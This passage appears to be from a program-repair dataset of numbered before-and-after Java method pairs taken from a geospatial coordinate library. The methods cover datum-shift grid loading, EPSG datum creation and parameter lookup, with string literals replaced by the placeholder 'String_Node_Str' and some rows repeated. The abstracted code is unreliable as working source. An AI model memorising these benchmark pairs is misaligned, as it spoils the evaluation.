    int afterVersion=code.indexOf(DefaultNameSpace.DEFAULT_SEPARATOR,++afterAuthority);
    start=CharSequences.skipLeadingWhitespaces(code,afterAuthority,afterVersion);
    end=CharSequences.skipTrailingWhitespaces(code,start,afterVersion);
    version=(start < end && !code.regionMatches(start,DefinitionURI.NO_VERSION,0,DefinitionURI.NO_VERSION.length())) ? code.substring(start,end) : null;
    code=CharSequences.trimWhitespaces(code,Math.max(afterAuthority,afterVersion + 1),code.length()).toString();
    parameters=null;
  }
  if (parameters != null || code.indexOf(CommonAuthorityFactory.SEPARATOR) >= 0) {
    final StringBuilder buffer=new StringBuilder(authority.length() + code.length() + 1).append(authority).append(DefaultNameSpace.DEFAULT_SEPARATOR).append(code);
    if (parameters != null) {
      for (      final String p : parameters) {
        buffer.append(CommonAuthorityFactory.SEPARATOR).append(p);
      }
    }
    code=buffer.toString();
  }
  return proxy.createFromAPI(getAuthorityFactory(AuthorityFactoryIdentifier.create(proxy.factoryType,authority,version)),code);
}"
91973,"/** 
 * Constructs a set to be filled using the specified iterator. Iteration with the given iterator will occur only when needed.
 * @param iterator The iterator to use for filling this set.
 */
public LazySet(final Iterator<? extends E> iterator){
  Objects.requireNonNull(sourceIterator);
  sourceIterator=iterator;
  source=null;
  createCache();
}","/** 
 * Constructs a set to be filled using the specified iterator. Iteration with the given iterator will occur only when needed.
 * @param iterator The iterator to use for filling this set.
 */
public LazySet(final Iterator<? extends E> iterator){
  Objects.requireNonNull(iterator);
  sourceIterator=iterator;
  source=null;
  createCache();
}"
91974,"/** 
 * Restores the contextual unit to its previous state before the call to   {@link #addContextualUnit(Unit)}. This method is used in the following pattern:  {@preformat javafinal Unit<?> previous = formatter.addContextualUnit(unit); // ... format some WKT elements here. formatter.restoreContextualUnit(unit, previous);}
 * @param unit The value given in argument to {@code addContextualUnit(unit)} (can be {@code null}).
 * @param previous The value returned by {@code addContextualUnit(unit)} (can be {@code null}).
 * @throws IllegalStateException if this method has not been invoked in the pattern documented above.
 * @since 0.6
 */
public void restoreContextualUnit(final Unit<?> unit,final Unit<?> previous){
  if (previous == null) {
    if (unit != null && units.remove(unit.toSI()) != unit) {
      if (!convention.usesCommonUnits) {
        throw new IllegalStateException();
      }
    }
  }
 else   if (units.put(previous.toSI(),previous) != unit) {
    throw new IllegalStateException();
  }
}","/** 
 * Restores the contextual unit to its previous state before the call to   {@link #addContextualUnit(Unit)}. This method is used in the following pattern:  {@preformat javafinal Unit<?> previous = formatter.addContextualUnit(unit); // ... format some WKT elements here. formatter.restoreContextualUnit(unit, previous);}
 * @param unit The value given in argument to {@code addContextualUnit(unit)} (can be {@code null}).
 * @param previous The value returned by {@code addContextualUnit(unit)} (can be {@code null}).
 * @throws IllegalStateException if this method has not been invoked in the pattern documented above.
 * @since 0.6
 */
public void restoreContextualUnit(final Unit<?> unit,final Unit<?> previous){
  if (previous == null) {
    if (unit != null && units.remove(unit.toSI()) != unit) {
      if (!convention.usesCommonUnits) {
        throw new IllegalStateException();
      }
    }
    hasContextualUnit&=~1;
  }
 else   if (units.put(previous.toSI(),previous) != unit) {
    throw new IllegalStateException();
  }
}"
91975,"/** 
 * Returns the name and description for the specified   {@link CoordinateSystemAxis} code.Many axes share the same name and description, so it is worth to cache them.
 */
private AxisName getAxisName(final Integer code) throws FactoryException {
}","/** 
 * Returns the name and description for the specified   {@link CoordinateSystemAxis} code.Many axes share the same name and description, so it is worth to cache them.
 */
private AxisName getAxisName(final Integer code) throws FactoryException, SQLException {
}"
91976,"/** 
 * Restores the contextual unit to its previous state before the call to   {@link #addContextualUnit(Unit)}. This method is used in the following pattern:  {@preformat javafinal Unit<?> previous = formatter.addContextualUnit(unit); // ... format some WKT elements here. formatter.restoreContextualUnit(unit, previous);}
 * @param unit The value given in argument to {@code addContextualUnit(unit)} (can be {@code null}).
 * @param previous The value returned by {@code addContextualUnit(unit)} (can be {@code null}).
 * @throws IllegalStateException if this method has not been invoked in the pattern documented above.
 * @since 0.6
 */
public void restoreContextualUnit(final Unit<?> unit,final Unit<?> previous){
  if (previous == null) {
    if (unit != null && units.remove(unit.toSI()) != unit) {
      if (!convention.usesCommonUnits) {
        throw new IllegalStateException();
      }
    }
  }
 else   if (units.put(previous.toSI(),previous) != unit) {
    throw new IllegalStateException();
  }
}","/** 
 * Restores the contextual unit to its previous state before the call to   {@link #addContextualUnit(Unit)}. This method is used in the following pattern:  {@preformat javafinal Unit<?> previous = formatter.addContextualUnit(unit); // ... format some WKT elements here. formatter.restoreContextualUnit(unit, previous);}
 * @param unit The value given in argument to {@code addContextualUnit(unit)} (can be {@code null}).
 * @param previous The value returned by {@code addContextualUnit(unit)} (can be {@code null}).
 * @throws IllegalStateException if this method has not been invoked in the pattern documented above.
 * @since 0.6
 */
public void restoreContextualUnit(final Unit<?> unit,final Unit<?> previous){
  if (previous == null) {
    if (unit != null && units.remove(unit.toSI()) != unit) {
      if (!convention.usesCommonUnits) {
        throw new IllegalStateException();
      }
    }
    hasContextualUnit&=~1;
  }
 else   if (units.put(previous.toSI(),previous) != unit) {
    throw new IllegalStateException();
  }
}"
91977,"/** 
 * Returns the name and description for the specified   {@link CoordinateSystemAxis} code.Many axes share the same name and description, so it is worth to cache them.
 */
private AxisName getAxisName(final Integer code) throws FactoryException {
}","/** 
 * Returns the name and description for the specified   {@link CoordinateSystemAxis} code.Many axes share the same name and description, so it is worth to cache them.
 */
private AxisName getAxisName(final Integer code) throws FactoryException, SQLException {
}"
91978,"/** 
 * Returns the grid of the given name. This method returns the cached instance if it still exists, or load the grid otherwise.
 * @param file      Name of the datum shift grid file to load.
 * @param averages  An ""average"" value for the offset in each dimension, or {@code null} if unknown.
 * @param scale     The factor by which to multiply each compressed value before to add to the average value.
 */
static DatumShiftGridFile<Angle,Length> getOrLoad(final Path file,final double[] averages,final double scale) throws FactoryException {
  final Path resolved=DataDirectory.DATUM_CHANGES.resolve(file).toAbsolutePath();
  DatumShiftGridFile<?,?> grid=DatumShiftGridFile.CACHE.peek(resolved);
  if (grid == null) {
    final Cache.Handler<DatumShiftGridFile<?,?>> handler=DatumShiftGridFile.CACHE.lock(resolved);
    try {
      grid=handler.peek();
      if (grid == null) {
        try (final BufferedReader in=Files.newBufferedReader(resolved)){
          DatumShiftGridLoader.log(FranceGeocentricInterpolation.class,file);
          final DatumShiftGridFile.Float<Angle,Length> g=load(in,file);
          grid=DatumShiftGridCompressed.compress(g,averages,scale);
        }
 catch (        IOException|NoninvertibleTransformException|RuntimeException e) {
          throw new FactoryException(Errors.format(Errors.Keys.CanNotParseFile_2,HEADER,file),e);
        }
        grid=grid.useSharedData();
      }
    }
  finally {
      handler.putAndUnlock(grid);
    }
  }
  return grid.castTo(Angle.class,Length.class);
}","/** 
 * Returns the grid of the given name. This method returns the cached instance if it still exists, or load the grid otherwise.
 * @param file      Name of the datum shift grid file to load.
 * @param averages  An ""average"" value for the offset in each dimension, or {@code null} if unknown.
 * @param scale     The factor by which to multiply each compressed value before to add to the average value.
 */
@SuppressWarnings(""String_Node_Str"") static DatumShiftGridFile<Angle,Length> getOrLoad(final Path file,final double[] averages,final double scale) throws FactoryException {
  final Path resolved=DataDirectory.DATUM_CHANGES.resolve(file).toAbsolutePath();
  DatumShiftGridFile<?,?> grid=DatumShiftGridFile.CACHE.peek(resolved);
  if (grid == null) {
    final Cache.Handler<DatumShiftGridFile<?,?>> handler=DatumShiftGridFile.CACHE.lock(resolved);
    try {
      grid=handler.peek();
      if (grid == null) {
        try (final BufferedReader in=Files.newBufferedReader(resolved)){
          DatumShiftGridLoader.log(FranceGeocentricInterpolation.class,file);
          final DatumShiftGridFile.Float<Angle,Length> g=load(in,file);
          grid=DatumShiftGridCompressed.compress(g,averages,scale);
        }
 catch (        IOException|NoninvertibleTransformException|RuntimeException e) {
          final String message=Errors.format(Errors.Keys.CanNotParseFile_2,HEADER,file);
          if (e instanceof NoSuchFileException) {
            throw new MissingFactoryResourceException(message,e);
          }
 else {
            throw new FactoryDataException(message,e);
          }
        }
        grid=grid.useSharedData();
      }
    }
  finally {
      handler.putAndUnlock(grid);
    }
  }
  return grid.castTo(Angle.class,Length.class);
}"
91979,"/** 
 * Returns the grid of the given name. This method returns the cached instance if it still exists, or load the grid otherwise.
 * @param latitudeShifts   Name of the grid file for latitude shifts.
 * @param longitudeShifts  Name of the grid file for longitude shifts.
 */
static DatumShiftGridFile<Angle,Angle> getOrLoad(final Path latitudeShifts,final Path longitudeShifts) throws FactoryException {
  final Path rlat=DataDirectory.DATUM_CHANGES.resolve(latitudeShifts).toAbsolutePath();
  final Path rlon=DataDirectory.DATUM_CHANGES.resolve(longitudeShifts).toAbsolutePath();
  final Object key=new AbstractMap.SimpleImmutableEntry<>(rlat,rlon);
  DatumShiftGridFile<?,?> grid=DatumShiftGridFile.CACHE.peek(key);
  if (grid == null) {
    final Cache.Handler<DatumShiftGridFile<?,?>> handler=DatumShiftGridFile.CACHE.lock(key);
    try {
      grid=handler.peek();
      if (grid == null) {
        final Loader loader;
        Path file=latitudeShifts;
        try {
          final ByteBuffer buffer=ByteBuffer.allocate(4096).order(ByteOrder.LITTLE_ENDIAN);
          final FloatBuffer fb=buffer.asFloatBuffer();
          try (final ReadableByteChannel in=Files.newByteChannel(rlat)){
            DatumShiftGridLoader.log(NADCON.class,CharSequences.commonPrefix(latitudeShifts.toString(),longitudeShifts.toString()).toString() + '');
            loader=new Loader(in,buffer,file);
            loader.readGrid(fb,null,longitudeShifts);
          }
           buffer.clear();
          file=longitudeShifts;
          try (final ReadableByteChannel in=Files.newByteChannel(rlon)){
            new Loader(in,buffer,file).readGrid(fb,loader,null);
          }
         }
 catch (        IOException|NoninvertibleTransformException|RuntimeException e) {
          throw new FactoryException(Errors.format(Errors.Keys.CanNotParseFile_2,""String_Node_Str"",file),e);
        }
        grid=DatumShiftGridCompressed.compress(loader.grid,null,loader.grid.accuracy);
        grid=grid.useSharedData();
      }
    }
  finally {
      handler.putAndUnlock(grid);
    }
  }
  return grid.castTo(Angle.class,Angle.class);
}","/** 
 * Returns the grid of the given name. This method returns the cached instance if it still exists, or load the grid otherwise.
 * @param latitudeShifts   Name of the grid file for latitude shifts.
 * @param longitudeShifts  Name of the grid file for longitude shifts.
 */
@SuppressWarnings(""String_Node_Str"") static DatumShiftGridFile<Angle,Angle> getOrLoad(final Path latitudeShifts,final Path longitudeShifts) throws FactoryException {
  final Path rlat=DataDirectory.DATUM_CHANGES.resolve(latitudeShifts).toAbsolutePath();
  final Path rlon=DataDirectory.DATUM_CHANGES.resolve(longitudeShifts).toAbsolutePath();
  final Object key=new AbstractMap.SimpleImmutableEntry<>(rlat,rlon);
  DatumShiftGridFile<?,?> grid=DatumShiftGridFile.CACHE.peek(key);
  if (grid == null) {
    final Cache.Handler<DatumShiftGridFile<?,?>> handler=DatumShiftGridFile.CACHE.lock(key);
    try {
      grid=handler.peek();
      if (grid == null) {
        final Loader loader;
        Path file=latitudeShifts;
        try {
          final ByteBuffer buffer=ByteBuffer.allocate(4096).order(ByteOrder.LITTLE_ENDIAN);
          final FloatBuffer fb=buffer.asFloatBuffer();
          try (final ReadableByteChannel in=Files.newByteChannel(rlat)){
            DatumShiftGridLoader.log(NADCON.class,CharSequences.commonPrefix(latitudeShifts.toString(),longitudeShifts.toString()).toString() + '');
            loader=new Loader(in,buffer,file);
            loader.readGrid(fb,null,longitudeShifts);
          }
           buffer.clear();
          file=longitudeShifts;
          try (final ReadableByteChannel in=Files.newByteChannel(rlon)){
            new Loader(in,buffer,file).readGrid(fb,loader,null);
          }
         }
 catch (        IOException|NoninvertibleTransformException|RuntimeException e) {
          final String message=Errors.format(Errors.Keys.CanNotParseFile_2,""String_Node_Str"",file);
          if (e instanceof NoSuchFileException) {
            throw new MissingFactoryResourceException(message,e);
          }
 else {
            throw new FactoryDataException(message,e);
          }
        }
        grid=DatumShiftGridCompressed.compress(loader.grid,null,loader.grid.accuracy);
        grid=grid.useSharedData();
      }
    }
  finally {
      handler.putAndUnlock(grid);
    }
  }
  return grid.castTo(Angle.class,Angle.class);
}"
91980,"/** 
 * Returns the grid of the given name. This method returns the cached instance if it still exists, or load the grid otherwise.
 * @param file Name of the datum shift grid file to load.
 */
static DatumShiftGridFile<Angle,Angle> getOrLoad(final Path file) throws FactoryException {
  final Path resolved=DataDirectory.DATUM_CHANGES.resolve(file).toAbsolutePath();
  DatumShiftGridFile<?,?> grid=DatumShiftGridFile.CACHE.peek(resolved);
  if (grid == null) {
    final Cache.Handler<DatumShiftGridFile<?,?>> handler=DatumShiftGridFile.CACHE.lock(resolved);
    try {
      grid=handler.peek();
      if (grid == null) {
        try (final ReadableByteChannel in=Files.newByteChannel(resolved)){
          DatumShiftGridLoader.log(NTv2.class,file);
          final Loader loader=new Loader(in,file);
          grid=loader.readGrid();
          loader.reportWarnings();
        }
 catch (        IOException|NoninvertibleTransformException|RuntimeException e) {
          throw new FactoryException(Errors.format(Errors.Keys.CanNotParseFile_2,""String_Node_Str"",file),e);
        }
        grid=grid.useSharedData();
      }
    }
  finally {
      handler.putAndUnlock(grid);
    }
  }
  return grid.castTo(Angle.class,Angle.class);
}","/** 
 * Returns the grid of the given name. This method returns the cached instance if it still exists, or load the grid otherwise.
 * @param file Name of the datum shift grid file to load.
 */
@SuppressWarnings(""String_Node_Str"") static DatumShiftGridFile<Angle,Angle> getOrLoad(final Path file) throws FactoryException {
  final Path resolved=DataDirectory.DATUM_CHANGES.resolve(file).toAbsolutePath();
  DatumShiftGridFile<?,?> grid=DatumShiftGridFile.CACHE.peek(resolved);
  if (grid == null) {
    final Cache.Handler<DatumShiftGridFile<?,?>> handler=DatumShiftGridFile.CACHE.lock(resolved);
    try {
      grid=handler.peek();
      if (grid == null) {
        try (final ReadableByteChannel in=Files.newByteChannel(resolved)){
          DatumShiftGridLoader.log(NTv2.class,file);
          final Loader loader=new Loader(in,file);
          grid=loader.readGrid();
          loader.reportWarnings();
        }
 catch (        IOException|NoninvertibleTransformException|RuntimeException e) {
          final String message=Errors.format(Errors.Keys.CanNotParseFile_2,""String_Node_Str"",file);
          if (e instanceof NoSuchFileException) {
            throw new MissingFactoryResourceException(message,e);
          }
 else {
            throw new FactoryDataException(message,e);
          }
        }
        grid=grid.useSharedData();
      }
    }
  finally {
      handler.putAndUnlock(grid);
    }
  }
  return grid.castTo(Angle.class,Angle.class);
}"
91981,"/** 
 * Creates an arbitrary datum from a code. The returned object will typically be an instance of   {@link GeodeticDatum},   {@link VerticalDatum} or {@link TemporalDatum}. <div class=""note""><b>Example:</b> some EPSG codes for datums are: <table class=""sis"" summary=""EPSG codes examples""> <tr><th>Code</th> <th>Type</th>        <th>Description</th></tr> <tr><td>6326</td> <td>Geodetic</td>    <td>World Geodetic System 1984</td></tr> <tr><td>6322</td> <td>Geodetic</td>    <td>World Geodetic System 1972</td></tr> <tr><td>1027</td> <td>Vertical</td>    <td>EGM2008 geoid</td></tr> <tr><td>5100</td> <td>Vertical</td>    <td>Mean Sea Level</td></tr> <tr><td>9315</td> <td>Engineering</td> <td>Seismic bin grid datum</td></tr> </table></div>
 * @param code Value allocated by EPSG.
 * @return The datum for the given code.
 * @throws NoSuchAuthorityCodeException if the specified {@code code} was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 * @todo Current implementation maps all ""vertical"" datum to {@link VerticalDatumType#GEOIDAL}. We do not know yet how to maps the exact vertical datum type from the EPSG database.
 */
@Override public synchronized Datum createDatum(final String code) throws NoSuchAuthorityCodeException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",code);
  Datum returnValue=null;
  try (ResultSet result=executeQuery(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"",code)){
    while (result.next()) {
      final Integer epsg=getInteger(code,result,1);
      final String name=getString(code,result,2);
      final String type=getString(code,result,3);
      final String anchor=getOptionalString(result,4);
      final String epoch=getOptionalString(result,5);
      final String area=getOptionalString(result,6);
      final String scope=getOptionalString(result,7);
      final String remarks=getOptionalString(result,8);
      final boolean deprecated=getOptionalBoolean(result,9);
      Map<String,Object> properties=createProperties(""String_Node_Str"",name,epsg,area,scope,remarks,deprecated);
      if (anchor != null) {
        properties.put(Datum.ANCHOR_POINT_KEY,anchor);
      }
      if (epoch != null && !epoch.isEmpty())       try {
        final int year=Integer.parseInt(epoch);
        final Calendar calendar=getCalendar();
        calendar.set(year,0,1);
        properties.put(Datum.REALIZATION_EPOCH_KEY,calendar.getTime());
      }
 catch (      NumberFormatException exception) {
        unexpectedException(""String_Node_Str"",exception);
      }
      final DatumFactory datumFactory=parent.datumFactory;
      final Datum datum;
switch (type.toLowerCase(Locale.US)) {
case ""String_Node_Str"":
{
          properties=new HashMap<>(properties);
          final Ellipsoid ellipsoid=parent.createEllipsoid(getString(code,result,10));
          final PrimeMeridian meridian=parent.createPrimeMeridian(getString(code,result,11));
          final BursaWolfParameters[] param=createBursaWolfParameters(epsg);
          if (param != null) {
            properties.put(DefaultGeodeticDatum.BURSA_WOLF_KEY,param);
          }
          datum=datumFactory.createGeodeticDatum(properties,ellipsoid,meridian);
          break;
        }
case ""String_Node_Str"":
{
        datum=datumFactory.createVerticalDatum(properties,VerticalDatumType.GEOIDAL);
        break;
      }
case ""String_Node_Str"":
{
      final Date originDate;
      if (anchor == null || anchor.isEmpty()) {
        throw new FactoryDataException(error().getString(Errors.Keys.DatumOriginShallBeDate));
      }
      if (dateFormat == null) {
        dateFormat=new SimpleDateFormat(""String_Node_Str"",Locale.CANADA);
        dateFormat.setCalendar(getCalendar());
      }
      try {
        originDate=dateFormat.parse(anchor);
      }
 catch (      ParseException e) {
        throw new FactoryDataException(error().getString(Errors.Keys.DatumOriginShallBeDate),e);
      }
      datum=datumFactory.createTemporalDatum(properties,originDate);
      break;
    }
case ""String_Node_Str"":
{
    datum=datumFactory.createEngineeringDatum(properties);
    break;
  }
default :
{
  throw new FactoryDataException(error().getString(Errors.Keys.UnknownType_1,type));
}
}
returnValue=ensureSingleton(datum,returnValue,code);
}
}
 catch (SQLException exception) {
throw databaseFailure(Datum.class,code,exception);
}
if (returnValue == null) {
throw noSuchAuthorityCode(Datum.class,code);
}
return returnValue;
}","/** 
 * Creates an arbitrary datum from a code. The returned object will typically be an instance of   {@link GeodeticDatum},   {@link VerticalDatum} or {@link TemporalDatum}. <div class=""note""><b>Example:</b> some EPSG codes for datums are: <table class=""sis"" summary=""EPSG codes examples""> <tr><th>Code</th> <th>Type</th>        <th>Description</th></tr> <tr><td>6326</td> <td>Geodetic</td>    <td>World Geodetic System 1984</td></tr> <tr><td>6322</td> <td>Geodetic</td>    <td>World Geodetic System 1972</td></tr> <tr><td>1027</td> <td>Vertical</td>    <td>EGM2008 geoid</td></tr> <tr><td>5100</td> <td>Vertical</td>    <td>Mean Sea Level</td></tr> <tr><td>9315</td> <td>Engineering</td> <td>Seismic bin grid datum</td></tr> </table></div>
 * @param code Value allocated by EPSG.
 * @return The datum for the given code.
 * @throws NoSuchAuthorityCodeException if the specified {@code code} was not found.
 * @throws FactoryException if the object creation failed for some other reason.
 * @todo Current implementation maps all ""vertical"" datum to {@link VerticalDatumType#GEOIDAL}. We do not know yet how to maps the exact vertical datum type from the EPSG database.
 */
@Override public synchronized Datum createDatum(final String code) throws NoSuchAuthorityCodeException, FactoryException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",code);
  Datum returnValue=null;
  try (ResultSet result=executeQuery(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"" + ""String_Node_Str"" + ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str""+ ""String_Node_Str"",code)){
    while (result.next()) {
      final Integer epsg=getInteger(code,result,1);
      final String name=getString(code,result,2);
      final String type=getString(code,result,3);
      final String anchor=getOptionalString(result,4);
      final String epoch=getOptionalString(result,5);
      final String area=getOptionalString(result,6);
      final String scope=getOptionalString(result,7);
      final String remarks=getOptionalString(result,8);
      final boolean deprecated=getOptionalBoolean(result,9);
      Map<String,Object> properties=createProperties(""String_Node_Str"",name,epsg,area,scope,remarks,deprecated);
      if (anchor != null) {
        properties.put(Datum.ANCHOR_POINT_KEY,anchor);
      }
      if (epoch != null && !epoch.isEmpty())       try {
        final int year=Integer.parseInt(epoch);
        final Calendar calendar=getCalendar();
        calendar.set(year,0,1);
        properties.put(Datum.REALIZATION_EPOCH_KEY,calendar.getTime());
      }
 catch (      NumberFormatException exception) {
        unexpectedException(""String_Node_Str"",exception);
      }
      final DatumFactory datumFactory=parent.datumFactory;
      final Datum datum;
switch (type.toLowerCase(Locale.US)) {
case ""String_Node_Str"":
{
          properties=new HashMap<>(properties);
          final Ellipsoid ellipsoid=parent.createEllipsoid(getString(code,result,10));
          final PrimeMeridian meridian=parent.createPrimeMeridian(getString(code,result,11));
          final BursaWolfParameters[] param=createBursaWolfParameters(epsg);
          if (param != null) {
            properties.put(DefaultGeodeticDatum.BURSA_WOLF_KEY,param);
          }
          datum=datumFactory.createGeodeticDatum(properties,ellipsoid,meridian);
          break;
        }
case ""String_Node_Str"":
{
        datum=datumFactory.createVerticalDatum(properties,VerticalDatumType.GEOIDAL);
        break;
      }
case ""String_Node_Str"":
{
      final Date originDate;
      if (anchor == null || anchor.isEmpty()) {
        throw new FactoryDataException(error().getString(Errors.Keys.DatumOriginShallBeDate));
      }
      if (dateFormat == null) {
        dateFormat=new SimpleDateFormat(""String_Node_Str"",Locale.CANADA);
        dateFormat.setCalendar(getCalendar());
      }
      try {
        originDate=dateFormat.parse(anchor);
      }
 catch (      ParseException e) {
        throw new FactoryDataException(error().getString(Errors.Keys.DatumOriginShallBeDate),e);
      }
      datum=datumFactory.createTemporalDatum(properties,originDate);
      break;
    }
case ""String_Node_Str"":
{
    datum=datumFactory.createEngineeringDatum(properties);
    break;
  }
default :
{
  throw new FactoryDataException(error().getString(Errors.Keys.UnknownType_1,type));
}
}
returnValue=ensureSingleton(datum,returnValue,code);
if (result.isClosed()) {
break;
}
}
}
 catch (SQLException exception) {
throw databaseFailure(Datum.class,code,exception);
}
if (returnValue == null) {
throw noSuchAuthorityCode(Datum.class,code);
}
return returnValue;
}"
91982,"/** 
 * Returns an unmodifiable implementation of the given parameter value. This method shall be used only with: <ul> <li>immutable   {@linkplain #getDescriptor() descriptor},</li> <li>immutable or null   {@linkplain #getUnit() unit}, and</li> <li>immutable or   {@linkplain Cloneable cloneable} parameter {@linkplain #getValue() value}.</li> </ul> If the parameter value implements the   {@link Cloneable} interface and has a public {@code clone()} method,then that value will be cloned every time the  {@link #getValue()} method is invoked.The value is not cloned by this method however; it is caller's responsibility to not modify the value of the given  {@code parameter} instance after this method call.<div class=""section"">Instances sharing</div> If this method is invoked more than once with equal  {@linkplain #getDescriptor() descriptor},  {@linkplain #getValue() value} and {@linkplain #getUnit() unit}, then this method will return the same   {@code DefaultParameterValue} instance on a <cite>best effort</cite> basis.<div class=""note""><b>Rational:</b> the same parameter value is often used in many different coordinate operations. For example all <cite>Universal Transverse Mercator</cite> (UTM) projections use the same scale factor (0.9996) and false easting (500000 metres). </div>
 * @param < T > The type of the value stored in the given parameter.
 * @param parameter The parameter to make unmodifiable, or {@code null}.
 * @return An unmodifiable implementation of the given parameter, or {@code null} if the given parameter was null.
 * @since 0.6
 */
public static <T>DefaultParameterValue<T> unmodifiable(final ParameterValue<T> parameter){
  return UnmodifiableParameterValue.create(parameter);
}","/** 
 * Returns an unmodifiable implementation of the given parameter value. This method shall be used only with: <ul> <li>immutable   {@linkplain #getDescriptor() descriptor},</li> <li>immutable or null   {@linkplain #getUnit() unit}, and</li> <li>immutable or   {@linkplain Cloneable cloneable} parameter {@linkplain #getValue() value}.</li> </ul> If the parameter value implements the   {@link Cloneable} interface and has a public {@code clone()} method,then that value will be cloned every time the  {@link #getValue()} method is invoked.The value is not cloned by this method however; it is caller's responsibility to not modify the value of the given  {@code parameter} instance after this method call.<div class=""section"">Instances sharing</div> If this method is invoked more than once with equal  {@linkplain #getDescriptor() descriptor},  {@linkplain #getValue() value} and {@linkplain #getUnit() unit}, then this method will return the same   {@code DefaultParameterValue} instance on a <cite>best effort</cite> basis.<div class=""note""><b>Rational:</b> the same parameter value is often used in many different coordinate operations. For example all <cite>Universal Transverse Mercator</cite> (UTM) projections use the same scale factor (0.9996) and false easting (500000 metres). </div>
 * @param < T > The type of the value stored in the given parameter.
 * @param parameter The parameter to make unmodifiable, or {@code null}.
 * @return An unmodifiable implementation of the given parameter, or {@code null} if the given parameter was null.
 * @since 0.6
 * @see DefaultParameterValueGroup#unmodifiable(ParameterValueGroup)
 */
public static <T>DefaultParameterValue<T> unmodifiable(final ParameterValue<T> parameter){
  return UnmodifiableParameterValue.create(parameter);
}"
91983,"/** 
 * Returns all subgroups with the specified name. <p>This method do not create new groups: if the requested group is optional (i.e. <code>  {@linkplain DefaultParameterDescriptor#getMinimumOccurs() minimumOccurs} == 0</code>)and no value were defined previously, then this method returns an empty set.</p>
 * @param name The name of the parameter to search for.
 * @return The set of all parameter group for the given name.
 * @throws ParameterNotFoundException If no descriptor was found for the given name.
 */
@Override public List<ParameterValueGroup> groups(final String name) throws ParameterNotFoundException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",name);
  final ParameterValueList values=this.values;
  final List<ParameterValueGroup> groups=new ArrayList<>(4);
  final int size=values.size();
  for (int i=0; i < size; i++) {
    final GeneralParameterDescriptor descriptor=values.descriptor(i);
    if (descriptor instanceof ParameterDescriptorGroup) {
      if (isHeuristicMatchForName(descriptor,name)) {
        groups.add((ParameterValueGroup)values.get(i));
      }
    }
  }
  if (groups.isEmpty()) {
    final ParameterDescriptorGroup descriptor=values.descriptor;
    if (!(descriptor.descriptor(name) instanceof ParameterDescriptorGroup)) {
      throw new ParameterNotFoundException(Errors.format(Errors.Keys.ParameterNotFound_2,descriptor.getName(),name),name);
    }
  }
  return groups;
}","/** 
 * Returns all subgroups with the specified name. <p>This method do not create new groups: if the requested group is optional (i.e. <code>  {@linkplain DefaultParameterDescriptor#getMinimumOccurs() minimumOccurs} == 0</code>)and no value were defined previously, then this method returns an empty set.</p>
 * @param name The name of the parameter to search for.
 * @return The set of all parameter group for the given name.
 * @throws ParameterNotFoundException if no descriptor was found for the given name.
 */
@Override public List<ParameterValueGroup> groups(final String name) throws ParameterNotFoundException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",name);
  final ParameterValueList values=this.values;
  final List<ParameterValueGroup> groups=new ArrayList<>(4);
  final int size=values.size();
  for (int i=0; i < size; i++) {
    final GeneralParameterDescriptor descriptor=values.descriptor(i);
    if (descriptor instanceof ParameterDescriptorGroup) {
      if (IdentifiedObjects.isHeuristicMatchForName(descriptor,name)) {
        groups.add((ParameterValueGroup)values.get(i));
      }
    }
  }
  if (groups.isEmpty()) {
    final ParameterDescriptorGroup descriptor=values.descriptor;
    if (!(descriptor.descriptor(name) instanceof ParameterDescriptorGroup)) {
      throw new ParameterNotFoundException(Errors.format(Errors.Keys.ParameterNotFound_2,Verifier.getDisplayName(descriptor),name),name);
    }
  }
  return groups;
}"
91984,"/** 
 * Returns the value in this group for the specified name if it exists, or   {@code null} if none.This method does not create any new  {@code ParameterValue} instance.
 * @see #isKnownImplementation()
 */
@Override ParameterValue<?> parameterIfExist(final String name) throws ParameterNotFoundException {
  final ParameterValueList values=this.values;
  final int size=values.size();
  for (int i=0; i < size; i++) {
    final GeneralParameterDescriptor descriptor=values.descriptor(i);
    if (descriptor instanceof ParameterDescriptor<?>) {
      if (name.equals(descriptor.getName().toString())) {
        return (ParameterValue<?>)values.get(i);
      }
    }
  }
  int fallback=-1;
  int ambiguity=-1;
  for (int i=0; i < size; i++) {
    final GeneralParameterDescriptor descriptor=values.descriptor(i);
    if (descriptor instanceof ParameterDescriptor<?>) {
      if (isHeuristicMatchForName(descriptor,name)) {
        if (fallback < 0) {
          fallback=i;
        }
 else {
          ambiguity=i;
        }
      }
    }
  }
  if (fallback >= 0) {
    if (ambiguity < 0) {
      return (ParameterValue<?>)values.get(fallback);
    }
    throw new ParameterNotFoundException(Errors.format(Errors.Keys.AmbiguousName_3,IdentifiedObjects.toString(values.descriptor(fallback).getName()),IdentifiedObjects.toString(values.descriptor(ambiguity).getName()),name),name);
  }
  return null;
}","/** 
 * Returns the value in this group for the specified name if it exists, or   {@code null} if none.This method does not create any new  {@code ParameterValue} instance.
 * @see #isKnownImplementation()
 */
@Override ParameterValue<?> parameterIfExist(final String name) throws ParameterNotFoundException {
  final ParameterValueList values=this.values;
  final int size=values.size();
  for (int i=0; i < size; i++) {
    final GeneralParameterDescriptor descriptor=values.descriptor(i);
    if (descriptor instanceof ParameterDescriptor<?>) {
      if (name.equals(descriptor.getName().toString())) {
        return (ParameterValue<?>)values.get(i);
      }
    }
  }
  int fallback=-1;
  int ambiguity=-1;
  for (int i=0; i < size; i++) {
    final GeneralParameterDescriptor descriptor=values.descriptor(i);
    if (descriptor instanceof ParameterDescriptor<?>) {
      if (IdentifiedObjects.isHeuristicMatchForName(descriptor,name)) {
        if (fallback < 0) {
          fallback=i;
        }
 else {
          ambiguity=i;
        }
      }
    }
  }
  if (fallback >= 0) {
    if (ambiguity < 0) {
      return (ParameterValue<?>)values.get(fallback);
    }
